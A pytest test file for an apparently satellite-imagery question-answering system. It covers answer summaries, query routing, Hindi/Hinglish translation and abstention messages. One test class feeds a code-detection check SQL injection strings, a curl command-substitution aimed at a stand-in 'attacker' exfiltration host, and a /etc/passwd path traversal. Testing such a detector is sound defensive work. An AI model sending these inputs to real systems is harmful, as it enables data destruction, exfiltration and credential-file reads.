"""Structured answer sections (satquery/synth/answer_details.py) and the
narrative fixes found on the live server on 2026-09-25."""

from __future__ import annotations

import pytest

from satquery.synth.answer_details import answer_details
from satquery.synth.narrative import compose_answer, describe_indices


def _trace(steps, *, images=None, understanding=None, answer="x", abstained=False):
    return {
        "answer": answer,
        "abstained": abstained,
        "execution": [
            {"tool": t, "outputs": o, "confidence_method": m} for t, o, m in steps
        ],
        "ingest": {"images": images or [{
            "role": "single", "container_format": "PNG", "bands": ["RED", "GREEN", "BLUE"],
            "georeferenced": False, "gsd_m": None, "lonlat_bounds": None,
        }]},
        "routing": {"understanding": understanding or {"intent": "ask", "query": "q", "resolved_query": "q"}},
        "confidence": {"final": 0.8, "band": "HIGH", "calibration": {"method": "uncalibrated (x)"}},
        "verification": {"entailment_gate": {"flagged": 0}},
    }


def _items(details, title):
    return next(s["items"] for s in details["sections"] if s["title"] == title)


class TestAnswerDetails:
    def test_abstained_run_has_no_details(self):
        assert answer_details(_trace([], abstained=True)) is None

    def test_grounding_box_is_placed_in_words(self):
        t = _trace([("grounding_v1", {"phrase": "the road", "normalised_cxcywh": [0.6, 0.83, 0.27, 0.24]}, "logprob")])
        found = _items(answer_details(t), "Findings")
        assert found == ["Located: “the road” in the bottom centre of the image, covering about 6.5% of it"]

    def test_several_boxes_are_numbered(self):
        t = _trace([("grounding_v1", {"phrase": "ships", "normalised_cxcywh": [[0.1, 0.1, 0.1, 0.1], [0.9, 0.9, 0.1, 0.1]]}, "logprob")])
        found = _items(answer_details(t), "Findings")
        assert found[0].startswith("Region 1: “ships” in the top left")
        assert found[1].startswith("Region 2: “ships” in the bottom right")

    def test_count_answer_names_the_object(self):
        t = _trace([("rs_vqa_v1", {"answer": "7"}, "logprob")],
                   understanding={"intent": "ask", "quantity": "count", "object_filter": "buildings"})
        assert _items(answer_details(t), "Findings") == ["Counted: 7 buildings"]

    def test_change_area_uses_square_metres_below_a_square_kilometre(self):
        t = _trace([("change_mask_v1", {"changed_fraction": 0.427, "changed_area_km2": 0.007,
                                        "threshold": 0.5, "tta": "dihedral8"}, "sharpness")])
        found = _items(answer_details(t), "Findings")
        assert found[0] == "Changed area: 42.7% of the scene (7,000 m²)"
        assert "8-fold test-time augmentation" in found[1]

    def test_landcover_on_rgb_is_flagged_out_of_domain(self):
        t = _trace([("landcover_v1", {"asserted": [{"class": "Pastures", "probability": 0.9}],
                                      "bands_present": 3, "n_denied": 18}, "mean_asserted_probability")])
        limits = _items(answer_details(t), "Limits")
        assert any("indicative only" in x for x in limits)

    def test_stub_tool_is_disclosed(self):
        t = _trace([("caption_v1", {"answer": "a placeholder"}, "stub")])
        assert any("placeholder" in x for x in _items(answer_details(t), "Limits"))

    def test_georeferenced_centre_carries_hemispheres(self):
        img = {"role": "t1", "container_format": "GTiff", "bands": ["RED"], "georeferenced": True,
               "gsd_m": 0.5, "lonlat_bounds": [-43.2, -22.95, -43.1, -22.85]}
        items = _items(answer_details(_trace([], images=[img])), "Imagery")
        assert "Centre: 22.9000° S, 43.1500° W" in items


class TestNarrativeFixes:
    def test_no_index_sentence_when_no_index_was_computed(self):
        # RGB-only input: the old text claimed "No dominant land-cover class
        # exceeded its detection threshold" beside an asserted class.
        assert describe_indices({"indices": {}}) == ""

    def test_low_indices_are_described_as_indices(self):
        text = describe_indices({"indices": {"ndvi": {"fraction_above_threshold": 0.01}}})
        assert "spectral index" in text and "land-cover" not in text

    def test_landcover_classes_are_not_listed_twice(self):
        answer = compose_answer(
            "SINGLE_LANDCOVER",
            "Detected land-cover classes: Transitional woodland, shrub.",
            [{"labels": ["Transitional woodland, shrub"]}],
            {"indices": {}},
            georeferenced=True,
        )
        assert answer.count("Transitional woodland") == 1


class TestOpenSceneQuestion:
    @pytest.mark.parametrize("query,expected", [
        ("what is in this picture?", True),
        ("What's in the image", True),
        ("what am i looking at", True),
        ("what do you see here?", True),
        ("what is this place used for?", False),
        ("what is the building at the top?", False),
        ("how many ships are there?", False),
        ("describe this image", False),
    ])
    def test_is_open_scene_question(self, query, expected):
        from satquery.controller.understanding import is_open_scene_question
        assert is_open_scene_question(query) is expected


class TestOpenQuestionRouting:
    @pytest.fixture
    def pieces(self, tmp_path):
        from evaluation.nl_understanding_eval import manifests
        from satquery.controller.matrix_loader import load_matrix
        from satquery.controller.router import Router

        return Router(load_matrix("configs/capability_matrix.yaml")), manifests(tmp_path)

    def test_open_question_goes_to_the_captioner_when_it_is_loaded(self, pieces, monkeypatch):
        router, by_config = pieces
        monkeypatch.setattr(type(router), "_captioner_loaded", lambda self: True)
        assert router.decide("what is in this picture?", by_config["SINGLE"]).plan.tasks[0] == "SINGLE_CAPTION"

    def test_open_question_stays_with_vqa_without_a_captioner(self, pieces, monkeypatch):
        router, by_config = pieces
        monkeypatch.setattr(type(router), "_captioner_loaded", lambda self: False)
        assert router.decide("what is in this picture?", by_config["SINGLE"]).plan.tasks[0] == "SINGLE_VQA"

    def test_specific_question_stays_with_vqa(self, pieces, monkeypatch):
        router, by_config = pieces
        monkeypatch.setattr(type(router), "_captioner_loaded", lambda self: True)
        assert router.decide("how many buildings are there?", by_config["SINGLE"]).plan.tasks[0] == "SINGLE_VQA"


class TestDeferralIsExplained:
    def test_a_tool_deferral_replaces_the_generic_low_confidence_advice(self):
        from satquery.controller.abstention import AbstentionPolicy, decide

        d = decide(
            policy=AbstentionPolicy(), routed_to_abstain=False, blocking_failures=[],
            final_confidence=0.0, components={"model": 0.0, "agreement": 1.0, "input_quality": 0.85},
            failing_checks=[], conflicts=[], gate_sentences=0, gate_flagged=0,
            tool_deferral="change_vqa_v1: this question is not one the change-map arithmetic answers",
        )
        assert d.abstained and "declined it" in d.reason
        assert "near-infrared" in d.resolving_input
        assert "higher-resolution" not in d.resolving_input


class TestChangeExtentInTheDescription:
    def test_change_description_states_the_measured_extent(self):
        answer = compose_answer(
            "TEMPORAL_CHANGE_DESC",
            "many houses are built along the road",
            [{"changed_fraction": 0.427, "changed_area_km2": 0.007}, {"caption": "x"}],
            {"indices": {}},
            georeferenced=True,
        )
        assert "Many" not in answer  # the caption is kept as written
        assert "The change detector marks 42.7% of the scene as changed (about 7,000 m2)." in answer


class TestLiveCheckTwo:
    """Second live check (2026-09-25): three more answer gaps."""

    @pytest.mark.parametrize("query", [
        "is photo mein kya dikh raha hai?", "yeh kaunsi jagah hai?",
        "इस तस्वीर में क्या है?", "यह कौन सी जगह है?",
    ])
    def test_hinglish_and_hindi_open_questions(self, query):
        from satquery.controller.understanding import is_open_scene_question
        assert is_open_scene_question(query)

    @pytest.mark.parametrize("query", ["kya haal hai bhai", "is this urban?", "what is this place used for?"])
    def test_not_open_questions(self, query):
        from satquery.controller.understanding import is_open_scene_question
        assert not is_open_scene_question(query)

    @pytest.mark.parametrize("query,expected", [
        ("how much area changed?", True),
        ("what percentage of the scene changed?", True),
        ("how much did the water area change?", False),
        ("did anything change?", False),
    ])
    def test_overall_change_amount(self, query, expected):
        from satquery.controller.understanding import is_overall_change_amount
        assert is_overall_change_amount(query) is expected

    def test_how_much_area_changed_routes_to_the_change_mask(self, tmp_path):
        from evaluation.nl_understanding_eval import manifests
        from satquery.controller.matrix_loader import load_matrix
        from satquery.controller.router import Router

        router = Router(load_matrix("configs/capability_matrix.yaml"))
        pair = manifests(tmp_path)["BITEMPORAL_PAIR"]
        assert router.decide("how much area changed?", pair).plan.tasks[0] == "TEMPORAL_CHANGE_MAP"
        assert router.decide("how much did the water area change?", pair).plan.tasks[0] == "TEMPORAL_CHANGE_VQA"

    def test_hinglish_open_question_captions_when_the_captioner_is_loaded(self, tmp_path, monkeypatch):
        from evaluation.nl_understanding_eval import manifests
        from satquery.controller.matrix_loader import load_matrix
        from satquery.controller.router import Router

        monkeypatch.setattr(Router, "_captioner_loaded", lambda self: True)
        router = Router(load_matrix("configs/capability_matrix.yaml"))
        single = manifests(tmp_path)["SINGLE"]
        assert router.decide("yeh kaunsi jagah hai?", single).plan.tasks[0] == "SINGLE_CAPTION"

    def test_change_area_below_a_square_kilometre_is_in_square_metres(self):
        from satquery.tools.change_mask import _area_text
        assert _area_text(0.007) == "about 7,000 m2"
        assert _area_text(2.345) == "2.35 km2"


class TestCodeShapedQueries:
    @pytest.mark.parametrize("query", [
        "SELECT * FROM images; DROP TABLE users;", "'; DROP TABLE runs; --",
        "$(curl http://attacker/exfil)", "../../../../etc/passwd", "' OR '1'='1",
    ])
    def test_code_like(self, query):
        from satquery.controller.understanding import is_code_like
        assert is_code_like(query)

    @pytest.mark.parametrize("query", [
        "select the buildings in the north", "update me on what changed", "where is the road?",
    ])
    def test_not_code_like(self, query):
        from satquery.controller.understanding import is_code_like
        assert not is_code_like(query)


class TestEnglishRendering:
    """Hinglish/Hindi rendered into the English the VLM adapters were tuned on."""

    @pytest.mark.parametrize("query,expected", [
        ("क्या यहाँ पानी है?", "Is there any water in this image?"),
        ("is image mein kitni buildings hain?", "How many buildings are there in this image?"),
        ("sadak kahan hai?", "Where is the road?"),
        ("इस चित्र का वर्णन करो", "Describe this image."),
        ("kya badla hai dono tasveeron mein?", "What changed between the two images?"),
        ("क्या हरियाली कम हुई है?", "Did the vegetation extent decrease between the two dates?"),
        ("कितना क्षेत्र बदला?", "How much area changed between the two images?"),
        ("optical aur radar dono milake buildings dhundo", "Combine the optical and radar images to find the buildings."),
    ])
    def test_rendering(self, query, expected):
        from satquery.controller.understanding import to_english
        assert to_english(query) == expected

    @pytest.mark.parametrize("query", ["what is in this picture?", "how much area changed?", "namaste", "kya haal hai"])
    def test_english_and_unmapped_queries_are_left_alone(self, query):
        from satquery.controller.understanding import to_english
        assert to_english(query) is None

    def test_translation_is_not_reported_as_a_follow_up(self, tmp_path):
        from evaluation.nl_understanding_eval import manifests
        from satquery.controller.matrix_loader import load_matrix
        from satquery.controller.router import Router

        d = Router(load_matrix("configs/capability_matrix.yaml")).decide("क्या यहाँ पानी है?", manifests(tmp_path)["SINGLE"])
        assert d.understanding.resolved_query == "Is there any water in this image?"
        assert d.understanding.follow_up is False
        assert d.understanding.resolution == "translated from Hinglish/Hindi"
